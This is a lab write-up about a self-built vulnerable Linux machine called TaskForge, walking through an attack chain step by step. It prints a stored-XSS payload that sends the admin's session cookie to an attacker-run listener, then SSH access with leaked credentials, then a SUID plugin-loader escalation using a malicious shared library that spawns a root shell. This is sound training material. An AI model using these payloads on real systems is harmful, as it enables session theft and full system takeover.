Vulnerable Linux Security Lab

TaskForge

A deliberately vulnerable Linux machine created to practice stored XSS, web-to-system attack chains, and SUID-based privilege escalation in a controlled environment.

  • Linux
  • Flask
  • Stored XSS
  • SUID
  • Privilege Escalation

01 · Overview

Project objectives

I created TaskForge primarily as a hands-on exercise for understanding stored cross-site scripting. Instead of using an existing vulnerable application, I built the application myself so I could study how the vulnerability occurs inside an application I designed.

The second objective was to practice SUID-based privilege escalation. The machine combines both concepts into a single exploitation chain.

03 · Components

Machine architecture

TaskForge Web Application

The TaskForge web application is a Flask application managed by taskforge.service. It listens on port 5000 and provides the functionality used to submit and review security findings.

Firefox / geckodriver

The machine uses Firefox through geckodriver for browser automation. The WebDriver interface listens only on 127.0.0.1:4444.

Persistent Admin Reviewer

The reviewer automatically logs into the TaskForge application as the administrator and visits pending findings. This provides the browser context required for the stored-XSS portion of the attack chain.

Custom SUID Binary

/usr/local/bin/taskforge-plugin is a custom SUID-root plugin loader. It loads shared libraries from /opt/taskforge/plugin-cache/.

04 · Enumeration

Nmap

I started with a full TCP port scan to identify the services exposed by the target. 

nmap -p- -sCV 192.168.56.106 -oN taskforge_scan

The scan identified SSH on port 22 and a Werkzeug HTTP service on port 5000. The HTTP scripts also identified /login, so I focused the next stage of enumeration on the web application.

  • -p- scans all 65,535 TCP ports.
  • -sC runs Nmap's default scripts.
  • -sV performs service version detection.
  • -oN saves the output in normal format.

05 · Web Enumeration

TaskForge application

After accessing the web application, I reached the login page and authenticated into the TaskForge dashboard.

The Findings section displayed previously submitted findings. Each finding could be opened to view its submitted details.

The application also provided a New Finding form containing fields such as a finding title and description. Because this content was subsequently displayed as part of the finding, I investigated the input handling.

06 · Foothold

Identifying stored XSS

A submitted finding is stored by the application and can later be viewed again. I tested whether JavaScript supplied in the finding content would be stored and executed when the finding was opened. 

<script>alert(document.cookie)</script>

When I opened the submitted finding, the JavaScript executed and displayed the session cookie. This confirmed that the finding content was vulnerable to stored XSS.

07 · Foothold

Admin reviewer

The application indicated that reviewers may visit submitted findings. Since the finding content was stored and rendered when viewed, this suggested that the stored payload could execute in the reviewer's browser.

Capturing the reviewer's session

I started a Python HTTP server to receive the request generated when the payload executed. 

python3 -m http.server 8888

I then submitted a new finding containing the following payload in the description field: 

<img src=x onerror='fetch("http://192.168.56.105:8888/?cookie"+document.cookie)'>

When the reviewer processed the finding, the Python server received a request containing the reviewer's session cookie.

I replaced my current application session with the captured session and refreshed the application. The application then recognized the session as the administrator account.

08 · Foothold

SSH access

The administrator interface exposed a Review Queue and a System Configuration section.

The System Configuration page exposed deployment configuration containing the SSH service information and credentials required to access the machine.

Using the obtained SSH credentials, I connected to the target as the admin user. 

ssh admin@192.168.56.106

09 · Privilege Escalation

SUID enumeration

After obtaining an SSH shell as admin, I enumerated the system for SUID-enabled binaries. 

find / -perm -4000 -type f 2>/dev/null

Inspecting taskforge-plugin

The custom /usr/local/bin/taskforge-plugin binary stood out from the SUID results. I checked its permissions, file type, and embedded strings. 

ls -l /usr/local/bin/taskforge-plugin
file /usr/local/bin/taskforge-plugin
strings /usr/local/bin/taskforge-plugin

One particularly useful string revealed the plugin loading convention: 

/opt/taskforge/plugin-cache/%s.so

This showed that the binary loads shared libraries from /opt/taskforge/plugin-cache/. I then checked the directory permissions.

The admin user could write to the plugin cache directory while the plugin loader itself executed with SUID privileges. This created a path for an attacker-controlled shared library to be loaded by the privileged process.

10 · Privilege Escalation

Shared library execution

I created a shared-library plugin containing a plugin_run() function that changes the process identity to UID/GID 0 and starts a shell. 

#include <stdlib.h>
#include <unistd.h>

void plugin_run(void)
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

I compiled the library as a shared object: 

gcc -shared -fPIC /tmp/rootshell.c -o /tmp/rootshell.so

I then copied the resulting library into the writable plugin cache: 

cp /tmp/rootshell.so /opt/taskforge/plugin-cache/

Finally, I executed the plugin through the SUID loader: 

/usr/local/bin/taskforge-plugin rootshell

I verified the resulting privilege level with: 

whoami
id

The privilege escalation works because the SUID taskforge-plugin loads a shared library from a location writable by the lower-privileged user. The attacker-controlled plugin is subsequently executed with the loader's elevated privileges.

11 · Takeaways

What I practiced

Stored XSS

Identifying when user-controlled content is stored and later rendered without appropriate output handling.

Browser-Based Attack Chains

Understanding how an automated privileged browser can change the impact of a stored-XSS vulnerability.

Linux Enumeration

Enumerating SUID binaries and investigating custom components rather than relying only on standard binaries.

Privilege Escalation

Analyzing the interaction between SUID execution, writable directories, and shared-library loading.
